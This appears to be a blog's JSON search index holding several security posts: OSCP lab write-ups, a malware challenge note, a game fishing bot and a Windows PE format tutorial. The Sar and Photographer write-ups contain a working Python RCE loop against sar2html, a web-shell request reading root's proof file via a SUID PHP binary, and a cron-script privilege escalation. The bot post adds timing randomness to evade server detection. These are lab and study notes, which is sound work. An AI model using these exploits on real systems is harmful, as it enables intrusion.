important thing here is that I\u0026rsquo;ve exported all the units into a single txt file and then I just spawn requests for each unit.\nConclusion I will be updating the SDK as I am progressing with the analytical tools and I will be adding new examples and adding new posts as I am doing it. For now you can keep an eye on the repository and I will be definitely posting/discussing more about it in the Discord Channel .\n", 
        "url": "http:\/\/localhost:1313\/posts\/2022-08-23-legiontd2-sdk\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-09-malware-analysis-2022cb-challenges\/": {
        "title": "Malware Analysis - CB Challenges",
        "tags": [],
        "content": "Overview Putting up my analysis of some malware samples.\nSamples Report 5dee718c386934d2494ee5ddde79d27a69c1687493b6eb40d0db47f730ab76fb View 6fd9909f8ec811577351402832665d4a6b6e5399422b8cac79dd98532ac48913 View 19a3dd8024bb4677261ecd8bb85e8a4c53d15870e4b9d2203e933a00b7eecb85 View 280d2ceb081745412127a018055234f5a72935a77aa102aef7924ba21f43d4ee View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd View f8c4c946eaedcfa8bbb722970211c2c4a458f6483dafb5d5a7fd83b3daa441cd I eventually found the XOR cipher key, unfortunately my bruteforce script wasn\u0026rsquo;t able to recover the url but in the end the string wasn\u0026rsquo;t exactly an url. The key was en-CB and the decoded string is c2.2go.ma1w.are_eT!/eab/+CE%\u0026amp;6d\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-09-malware-analysis-2022cb-challenges\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-04-15-pg-photographer\/": {
        "title": "Proving Grounds - Photographer",
        "tags": [],
        "content": "I\u0026rsquo;ve started my OSCP journey a while ago, and I wanted to try the PG machines, this is the first one that I\u0026rsquo;ve tried. The machine is fairly straightforward and it\u0026rsquo;s labeled easy.\nI\u0026rsquo;ve started with a simple nmap scan, which hinted that this Linux machine is part of an Active Directory.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 414daa1886948e88a74c6b426076f14f (RSA) | 256 4da3d07a8f64ef82452d011318b7e013 (ECDSA) |_ 256 1a017a4fcf9585bf31a14f1587ab94e2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Photographer by v1n1v131r4 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: daisa ahomi |_http-generator: Koken 0.22.24 Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel On the port 80 we have a simple web page which is more or less just a placeholder of a template, but on the 8000 we have a functional website build with Koken\n# Versions for :80 http://192.168.160.76:80/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.160.76], JQuery, Script, Title[Photographer by v1n1v131r4] # Versions for :8000 http://192.168.160.76:8000/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.160.76], JQuery[1.12.4], Meta-Author[daisa ahomi], MetaGenerator[Koken 0.22.24], Script, Title[daisa ahomi], X-UA-Compatible[IE=edge] I immediately searched for exploits for Koken 0.22.24, and found this one: https://www.exploit-db.com/exploits/48706 This is authenticated exploit, so it hinted that I must look further to get some credentials.\nUpon scanning the Active Directory (139,445) I found public shares, one of which was non-default sambashare.\n$ smbclient -N -L 192.168.160.76 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers sambashare Disk Samba on Ubuntu IPC$ IPC IPC Service (photographer server (Samba, Ubuntu)) I explored it and found 2 files, one was an email in a txt format and the other one was zipped WordPress site, I\u0026rsquo;ve scanned the WordPress source code with gf (https://github.com/tomnomnom/gf ) but found nothing. The mail thought had an interesting text inside that hinted two users and suggestion for a password.\nagi@photographer.com - Agi Clarence daisa@photographer.com - Daisa Ahomi I found the password for the user daisa@photographer.com in the content of the mail. (It is very simple!)\nAfter that, I logged into the Koken's Admin Panel and uploaded a simple PHP shell using the previously mentioned exploit. I could read the user/local.txt file that yielded the user own flag.\nThe root was pretty straightforward, upon scanning for SUID binaries, I found that /usr/bin/php7.2 was such, and a simple request with the previous active shell yielded me the root flag.\nGET /storage/originals/4f/38/image.php?cmd=/usr/bin/php7.2+-r+\u0026#39;readfile(\u0026#34;/root/proof.txt\u0026#34;)%3b\u0026#39; HTTP/1.1 Host: 192.168.210.76:8000 Upgrade-Insecure-Requests: 1 User-Agent: ... Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: koken_session_ci=... Connection: close ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-04-15-pg-photographer\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-04-15-pg-sar\/": {
        "title": "Proving Grounds (OSCP) - Sar",
        "tags": [],
        "content": "This was a fairly easy machine, I began with a nmap scan:\nPORT STATE SERVICE 22/tcp open ssh 80/tcp open http On port 80 there was a blank website, so I fuzz it and found bunch of files.\nhttp://192.168.210.35/robots.txt -\u0026gt; http://192.168.210.35/sar2HTML/ http://192.168.210.35/phpinfo.php Using the phpinfo I have enumerated the versions\nsar2html Ver 3.2.1 \u0026lt;-- Vulnerable Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 Apache/2.4.29 PHP 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 exif 7.1.32-1+ubuntu18.04.1+deb.sury.org+1 - JPEG,TIFF mysqlnd 5.0.12-dev - 20150407 Net_SFTP_Stream 0.3.2 SFTP Stream Wrapper sar2html Was vulnerable to RCE, and I\u0026rsquo;ve created a python script to exploit it further.\nimport bs4 import requests url = \u0026#34;http://\u0026lt;ip\u0026gt;/sar2HTML/index.php?plot=;\u0026#34; while True: command = input(\u0026#34;$ \u0026#34;) if command == \u0026#34;exit\u0026#34;: break else: response = requests.get(url + command.replace(\u0026#34; \u0026#34;, \u0026#34;%20\u0026#34;)) html = response.text soup = bs4.BeautifulSoup(html, \u0026#34;html.parser\u0026#34;) sel_tag = soup.find(\u0026#34;select\u0026#34;, {\u0026#34;class\u0026#34;: \u0026#34;select_text\u0026#34;}).children for c in sel_tag: if c.text == \u0026#34;Select Host\u0026#34;: continue if c.text == \u0026#34;There is no defined host...\u0026#34;: continue print(c.text) Using this script, you can read the user/local.txt file to get the first flag.\nI then run the linpeas script to check how to privilege escalation, I\u0026rsquo;ve noticed that there was a cron job that was running on the *.sh files in the /var/www/html folder:\n*/5 * * * * root cd /var/www/html/ \u0026amp;\u0026amp; sudo ./finally.sh finally.sh is actually calling write.sh which is writable by the www-data\n-rwxrwxrwx 1 www-data www-data 55 Mar 5 15:32 write.sh I\u0026rsquo;ve used the following script to get the root proof.txt\n# write.sh cat /root/proof.txt \u0026gt; /var/www/html/hash.txt Then I waited 5m to get the flag, I\u0026rsquo;ve done it this way since I got problems setting up the reverse shell, nonetheless I got root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-04-15-pg-sar\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-05-22-simple-fishing-bot\/": {
        "title": "Simple Fishing Bot for World of Warcraft",
        "tags": [],
        "content": "This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot Overview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\nFine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7 Variable Description FISHING_BUTTON The button that you use for fishing, in my case it was b TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10 ACTIVE_AFTER The bot simply waits 2 secs before it starts CONFIDENCE The confidence of the template matching How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching , this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2022-05-22-simple-fishing-bot\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-01-06-static-analysis-research-p1\/": {
        "title": "Static Analysis Research - Windows PE",
        "tags": [],
        "content": "Overview Recently, I decided do delve a little bit more into static analysis, something beyond just running strings on a binary and getting the ASCII characters that are printable. I decided to take a deep look at how FLOSS is working and possibly recreate some of its functionality in my own tool.\nBefore reading further, I want you to know that this post is about research I did on static analysis. There is nothing new here - no new tools or features are being discovered. Everything that I talk about already exists in other tools. A big part of this research uses the OpenAI Chat GPT. I made sure to fact-check the information provided here, as the GPT can sometimes produce misleading output.\nMy research focuses on Windows Portable Executable (PE) files because they are the most common type. Therefore, we\u0026rsquo;ll start by exploring how these files operate.\nKeywords RVA (Relative Virtual Address) - the virtual address of an object from the file once it is loaded into memory, minus the base address of the file image. IDT (Import Directory Table) - is a data structure in a Portable Executable (PE) file that stores information about dynamic-link libraries (DLLs) that the file depends on and the functions that the file imports from those DLLs. ILT - is a data structure in a Portable Executable (PE) file that stores the addresses of imported functions in the executable or library. IAT (Import Address Table) - can be the same with ILT, however when a file is being loaded into memory the loader will overwrite the addresses of the IAT with their new memory address locations. DEP (Data Execution Prevention) - is a security feature that is designed to prevent code from being executed in certain areas of memory where it is not supposed to be executed. doc ASLR (Address Space Layout Randomization) - is a security feature that randomizes the memory locations of certain parts of a program or operating system, making it more difficult for attackers to predict or control where certain code or data is located in memory. wiki Windows Portable Executable (PE) An executable is a set of binary data that contains instructions for the operating system to execute when the program is loaded into memory. Let\u0026rsquo;s examine how we can manually parse a Portable Executable (PE) file by reading and interpreting the bytes it contains. To do this, we must carefully review the binary data in the PE file and try to make sense of it.\nThe term image refers to the contents of a file when it is loaded into memory. You will encounter this term frequently in the explanations below.\nDOS Header The first 64 bytes of a binary file represent the DOS header, which is included for backwards compatibility and does not directly affect the functioning of the Portable Executable (PE). These 64 bytes contain information such as the number of pages in the file, the number of relocations, the checksum, OEM identifiers, and reserved words. The last 4 bytes of the DOS header, e_lfanew, contain the offset or address of the new PE header in modern Windows applications.\nThe first two bytes of an executable file, 4D 5A which translates to MZ in ASCII, serve as an indicator that the file is an executable intended for use on a Windows operating system.\nWhy 4D 5A? DOS Stub / Rich Header Following the first 64 bytes is the DOS Stub, a small program that displays an error message on systems that are not compatible with MS-DOS. This is a legacy feature dating back to the early days of Windows, when the operating system was built on top of MS-DOS.\nThe Rich Header, on the other hand, is not a required or standard part of the Portable Executable (PE) file format. It contains metadata about the compiler or packer that was used to create the executable and may provide additional information about the file. The magic number for the Rich Header is 52 69 63 68, which translates to Rich in ASCII.\nThe Rich Header information is encrypted using the XOR cipher, which can be easily decrypted using the 4 bytes immediately following the Rich ASCII which is the key.\nTo decrypt the rest of the header, we must run the XOR decipher on the file and unmask the value 44 61 6E 53, which translates to \u0026ldquo;DanS\u0026rdquo; in ASCII. This marks the beginning of the Rich Header, which is then followed by 3 0s after deciphering.\nWith this information, we can determine the start and end of the Rich Header and parse it accordingly.\nThe header can contain data about:\nCompiler and build environment information Timestamps Checksums Other metadata The Rich Header is a very interesting topic that I would like to write more about, until then you can read the following articles.\nVB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format The devil’s in the Rich header NT Headers (New Technology) If we follow the offset indicated in the last two bytes of the DOS header, we will reach the new PE headers (also known as NT headers). These headers are identified by the 4-byte magic number 50 45 00 00, which translates to PE.. in ASCII. This magic number is used to distinguish the PE headers from other types of headers.\nThe structure of the _IMAGE_NT_HEADERS64:\ntypedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; The structure of _IMAGE_FILE_HEADER:\ntypedef struct _IMAGE_FILE_HEADER { WORD Machine; // Predefined value [IMAGE_FILE_MACHINE_I386 or IMAGE_FILE_MACHINE_AMD64] WORD NumberOfSections; DWORD TimeDateStamp; // Timestamp of which the executable was compiled or linked DWORD PointerToSymbolTable; // The offset to the COFF Symbol Table DWORD NumberOfSymbols; // The number of symbols in the COFF Header WORD SizeOfOptionalHeader; WORD Characteristics; // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; What is COFF? The structure of _IMAGE_OPTIONAL_HEADER, this structure is \u0026ldquo;optional\u0026rdquo; but in fact most of the PE files contains this header.\ntypedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; // .text section size DWORD SizeOfInitializedData; // .data section size DWORD SizeOfUninitializedData; // .bss section size DWORD AddressOfEntryPoint; // 0 if a DLL because its optional otherwise it indicates the RVA (Relative Virtual Address) it is used to determine the address of elements within the file (strings, icons etc.) DWORD BaseOfCode; // The RVA is the base address of the code section loaded in memory DWORD BaseOfData; // The RVA for the base address of the data section DWORD ImageBase; // This indicates the prefered address at which the file is intended to be loaded in memory, almost never used address instead the PE Loader looks for unused memory space to load the image. DWORD SectionAlignment; // Sections are aligned in memory boundaries that are multiples of this value DWORD FileAlignment; // Raw data alignment on disk WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; // Reserved (for future use) must be 0, ensures that the file is compatible with the current system DWORD SizeOfImage; // It gets rounded to a multiple of `SectionAlignment` DWORD SizeOfHeaders; // Sum(DOS Stub, NT Headers, Section Headers) DWORD CheckSum; // Checksum of the Image WORD Subsystem; // Refer to documentation for this one WORD DllCharacteristics; // Refer to documentation for this one DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; // Obsolete refering to documentation, 0 DWORD NumberOfRvaAndSizes; // Size of DataDirectory below IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // This contains the addresses of the Export/Import Directories, the Base Relocation table and so on. It is a constant of `16`. } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; I\u0026rsquo;ve written some quick comments on each of the fields however since that struct is lengthy and well documented you can check the fields here as well.\nHere is the the list of Data Directories entries:\n#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor Sections Headers The section headers are stored in the NT Headers. And the structure of the IMAGE_SECTION_HEADER looks like this:\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Source and Documentation PE Format The sections of a Portable Executable (PE) file contain various types of data, such as code, data, resources, and other information. The headers of the file are used to specify the characteristics of these sections, such as whether they contain executable code, initialized data, uninitialized data, or other types of information.\nTip: You can detect if a PE file has been packed by comparing the values of the VirtualSize and SizeOfRawData fields in the headers. If the VirtualSize is significantly larger than the SizeOfRawData, it is a strong indication that the file has been packed. However, it is worth noting that there may be some discrepancy between the two values due to section padding and alignment.\nSections Sections are where the actual data of the file is. There are Special Sections as well but we will focus only on the reserved sections such as:\n.bss - Uninitialized data (free format) .data - Initialized data (free format) .cormeta - CLR metadata that indicates that the object file contains managed code .debug (following with) $F - Generated FPO Frame Poiner Omission debug information (obsolete) $P - Precompiled debug types (object only) $S - Debug symbols (object only) $T - Debug types (object only) .drective - Linker Options .edata/.idata - Export/Import Tables .idlsym - Includes registered SEH (image only) to support IDL attributes. Often used in conjuction with FPO ref .pdata - Exception information .rdata - Read-only initialized data .reloc - Relocations of the Image .rsrc - Resource Directory .s(following with) - Global Pointer-relative .sbss - uninitialized data .sdata - initialized data .srdata - read-only data .sxdata - Registered exception handler data (free format and x86/object only) .vsdata - initialized data (free format and for ARM, SH4, and Thumb architectures only) .text - Executable code (free format) .tls/.tls$ - Thread-local storage (object only) .xdata - Exception information (free format) Refer to the documentation for further explanation. Each section is explained very well there.\nImport Directory Table (IDT) The Import Directory Table (IDT) stores information about dynamic-link libraries (DLLs) that a Portable Executable (PE) file depends on and the functions that the file imports from those DLLs. In most cases, this information is stored in the .idata section of the PE file, which is dedicated to this purpose. However, in some cases, the IDT may be stored elsewhere.\nThe address of the IDT can be found in the IMAGE_DATA_DIRECTORY array of the _IMAGE_OPTIONAL_HEADER structure. It is the second entry in the array. Each entry in the IDT is 8 bytes in size, with the first 4 bytes representing the address of the entry and the second 4 bytes representing the size. This information is used by the operating system\u0026rsquo;s dynamic linker to resolve the addresses of the imported functions and link them to the actual functions in the imported DLLs.\nLet\u0026rsquo;s take a look at an example:\nCC280000 The IDT is located at 0xCC28 A0000000 The size is 160 (A0) Following the address of the Import Directory we reach the first import located at 0xCC28, let\u0026rsquo;s see what is located at that address.\nEach Import is defined by 24 bytes, given these 24 bytes values:\nF8290000 OriginalFirstThunk 00000000 Timestamp 00000000 Forwarder Chain (Address) C02A0000 Name of the Import (RVA) D8210000 FirstThunk OriginalFirstThunk/FirstThunk To find out which functions are imported by a particular import in a Portable Executable (PE) file, we can follow the OriginalFirstThunk address at 0xF829, which leads us to the Import Lookup Table (ILT). The ILT is a sequence of bytes that represents the addresses of the imported functions, similar to an array or table.\nNote: It\u0026rsquo;s important to note that the Import Address Table (IAT) may be the same as the ILT. However, when a file is loaded, the loader will overwrite the addresses in the IAT with the new memory addresses of the imported functions.\nEach function address in the ILT is 8 bytes in length, so the resulting data should look something like this:\nFC2A0000 This is the address of the imported function 00000000 at 0xFC2A -\u0026gt; B001 Ordinal/Name Import Flag 5368656C6C4578656375746557 ASCII -\u0026gt; \u0026#39;ShellExecuteW\u0026#39; 00 Null char terminating the string With this we can denote and \u0026lsquo;parse\u0026rsquo; all the imports and respectively their imported functions.\nResources To locate the resources in a Portable Executable (PE) file, you can use the third entry in the IMAGE_DATA_DIRECTORY array of the IMAGE_OPTIONAL_HEADER structure. This entry contains the address and size of the resources section in the file.\n00000000 Characteristics 00000000 TimeDateStamp 0000 Major Version 0000 Minor Version 0000 Number of Named entities 0400 Number of ID entities And the corresponding struct\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; WORD NumberOfIdEntries; IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } Now let\u0026rsquo;s take a look at the entries IMAGE_RESOURCE_DIRECTORY_ENTRY\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union { struct { DWORD NameOffset:31; DWORD NameIsString:1; } DUMMYSTRUCTNAME; DWORD Name; WORD Id; } DUMMYUNIONNAME; union { DWORD OffsetToData; // Leads us to the resource directory struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; } DUMMYSTRUCTNAME2; } DUMMYUNIONNAME2; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; The user mmn3mm has written a pretty good explanation of how to parse this section here .\nException Directory The Exception Directory is a section in a Portable Executable (PE) file that contains information about the exception handling functions in the code. It includes the addresses of the exception handling functions, the types of exceptions they handle, and other relevant details.\nWhen an exception occurs, the operating system\u0026rsquo;s exception handling mechanism uses the Exception Directory to find the appropriate exception handling function. This section is optional and may not be present in every PE file, depending on whether the code in the file uses exception handling.\nIt is typically located at .pdata section, and the offset to the Exception section is the 4th entry in the IMAGE_DATA_DIRECTORY array.\nPersonal Note: As far as I understood that section (I could be wrong here) it contains exception handlers that are being used throughout the execution and they execute only if the execution is within the specified BeginAddress and EndAddress.\nThe entries there are 12 bytes, first 4 bytes contains the BeginAddress the next 4 bytes contain the EndAddress and the last 4 bytes contains the address (UnwindInfoAddress) for the Unwind Information Block which contains information of how to unwind the stack whenever an exception occurs.\nBase Relocations When a program is compiled, the compiler saves a value into the IMAGE_OPTIONAL_HEADER.ImageBase field, which specifies the desired memory location where the program is intended to be executed. However, this memory location is often already occupied by other programs, so the actual memory location used by the program may be different. In this case, the loader will recalculate the ImageBase value and write the new value into the program\u0026rsquo;s image. This will cause all addresses in the program that are offset by the ImageBase value (essentially, all addresses in the program) to be recalculated with the new ImageBase value and stored in the .reloc section of the image. This process is necessary to ensure that the program can run correctly at its actual memory location.\nThe user 0xRick has written a very good article of how to calcuate the entries within the Relocation Block and more.\nDebug Microsoft Documentation The Debug section is the 7th entry of the IMAGE_DATA_DIRECTORY array, its structure looks like this:\ntypedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // Describing the debug info DWORD TimeDateStamp; WORD MajorVersion; // Version of the debugging tool WORD MinorVersion; // Version of the debugging tool DWORD Type; // Type of Debugging (this will denote the format that you need to parse) DWORD SizeOfData; // The size of the debug data (not including the debug directory itself) DWORD AddressOfRawData; // The address of the debug data when loaded, relative to the image base DWORD PointerToRawData; // The file pointer to the debug data. } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; Refer to the Microsoft\u0026rsquo;s Documentation about how to parse further debug information.\nLoad Config This section contains information about the dynamic linking and loading of the executable or library and it is the 11th entry of the IMAGE_DATA_DIRECTORY array. The Load Config section typically includes information such as the address of the entry point of the program, the size of the stack and heap, and the addresses of any imported functions or data.\nIt can also include security and integrity-related information, such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) settings.\nIt is typically located at .rdata section and it is an optional section for a PE file.\nThe structure follows:\ntypedef struct _IMAGE_LOAD_CONFIG_DIRECTORY { DWORD Size; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD GlobalFlagsClear; DWORD GlobalFlagsSet; DWORD CriticalSectionDefaultTimeout; DWORD DeCommitFreeBlockThreshold; DWORD DeCommitTotalFreeThreshold; PVOID LockPrefixTable; DWORD MaximumAllocationSize; DWORD VirtualMemoryThreshold; DWORD ProcessAffinityMask; DWORD ProcessHeapFlags; WORD CSDVersion; WORD DependentLoadFlags; PVOID EditList; PVOID SecurityCookie; PVOID SEHandlerTable; DWORD SEHandlerCount; PVOID GuardCFCheckFunctionPointer; PVOID GuardCFDispatchFunctionPointer; PVOID GuardCFFunctionTable; DWORD GuardCFFunctionCount; DWORD GuardFlags; } IMAGE_LOAD_CONFIG_DIRECTORY, *PIMAGE_LOAD_CONFIG_DIRECTORY; Access Rights of the Sections The section rights are presented in the DWORD Characteristics; field of the _IMAGE_SECTION_HEADER , you can check the valid values in the microsoft\u0026rsquo;s documentation .\nThose are the standard access rights of PE.\nSection Name Access Rights .text Read and Execute .rdata Read-Only .data Read and Write .bss Read and Write .rsrc Read Only .reloc Read Only Note: Seungwon Lee has indicated that if an essential element of an executable is the WRITE property of a section, the PE could be packed.\nConclusion This is the first part of my research on static analysis; the primary focus would be on Windows PEs and exactly how much information I can extract before going into the guessing territory.\nIn order for me to do that, I must know how do these files look like and what raw information is stored in their contents; that is why I started this research by examining Windows\u0026rsquo;s PE files.\nI hope you have reached that far and the information that I have provided is useful for you!\nReferences https://chat.openai.com/ https://github.com/mandiant/flare-floss https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings https://stackoverflow.com/questions/36550038/in-utf-16-utf-16be-utf-16le-is-the-endian-of-utf-16-the-computers-endianness https://0xrick.github.io/ https://securelist.com/the-devils-in-the-rich-header/84348/ https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/ https://forensicitguy.github.io/rich-header-hashes-with-pefile/ https://github.com/mmn3mm/peresources The Study of Evasion of Packed PE from Static Detection (Mirza Baig, Pavol Zavarsky, Ron Ruhl, Dale Lindskog) Han, Seungwon Lee, Keungi Lee, Sangjin, “Packed PE File Detection for Malware Forensics”, Computer Science and its Applications, 2nd International Conference, http://ieeexplore.ieee.org/stamp/stamp.jsp?arn umber=05404211, 12 Dec 2009 ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-01-06-static-analysis-research-p1\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-04-10-stix-taxii-complete-knowledge\/": {
        "title": "STIX\/TAXII - Complete Knowledge",
        "tags": [],
        "content": "Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example The data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their official example page .\nTAXII The STIX data has to be relayed in some way, that\u0026rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.\nTAXII 1.x Structure The TAXII 1.2 Server has the following structure:\nDiscovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers). Collection Management URL - The service that has the collections with STIX objects. Channels - Push/Subscribe pattern. The full list of features for TAXII1 can be found in their official documentation:\nhttps://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf https://www.oasis-open.org/committees/download.php/57324/OASIS TAXII 2.x Structure For the newer versions of the TAXII Server we have the following structure:\n/discovery - Discovers the paths to the different services provided by the Server. api_roots - Provides the API URLs for the different types of Collection Management. collections - Provides the available collections for the given api_root. collection/objects - Provides a list of STIX Objects in a given collection You can see that this is very similar to the TAXII 1.x servers, there isn\u0026rsquo;t much of a difference in the structure besides that the collection_management_url is api_root in TAXII 2.x.\nThe full list of features for TAXII2 can be found in their official documentation .\nTAXII Servers and Threat Intelligence Providers The information about this is very scarce so I\u0026rsquo;ve gathered a quick list of the known providers for STIX 